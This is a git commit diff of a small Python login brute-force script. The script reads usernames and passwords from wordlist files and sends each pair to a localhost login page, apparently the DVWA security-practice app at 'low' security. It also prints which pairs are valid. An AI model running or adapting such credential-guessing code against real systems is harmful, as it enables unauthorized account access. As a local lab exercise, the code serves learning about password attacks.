e7ec10e385c6925f4eccd40b9d3bfe6e759aaf82
Pedro Cros <pedrojcros@gmail.com>
2024-12-19 18:41:03 +0100

    finished

--- brute_force/frute_force.py
+++ brute_force/frute_force.py
@@ -1,10 +1,7 @@
-# Autor:
+# Autor: Pedro Jesús Cros Pérez
 import sys
 import requests
 from termcolor import colored, cprint
-
-# cookie = {"PHPSESSID": "qk9e71ier8vi62jumounl7jidf",
-#           "security": "low"}
 
 cookie = {}
 
@@ -12,21 +9,8 @@ def file_read(file):
     with open(file, mode='r', encoding='utf-8') as file_text:
         return file_text.read()
 
-
 user = file_read("user.txt").split("\n")
 password = file_read("password.txt").split("\n")
-
-'''
-for i in user:
-    for j in password:
-        url = f"http://localhost?username={i}&password={j}"
-        response = requests.get(url, cookies=cookie)
-
-        if not "Username and/or password incorrect." in response.text:
-            cprint(f"[+] {i}:{j} es valido", "green", attrs=["bold"], file=sys.stderr)
-        else:
-            cprint(f"[-] {i}:{j} no es valido", "red", attrs=["bold"], file=sys.stderr)
-'''
 
 for i in range(len(user)):
     for j in range(len(password)):
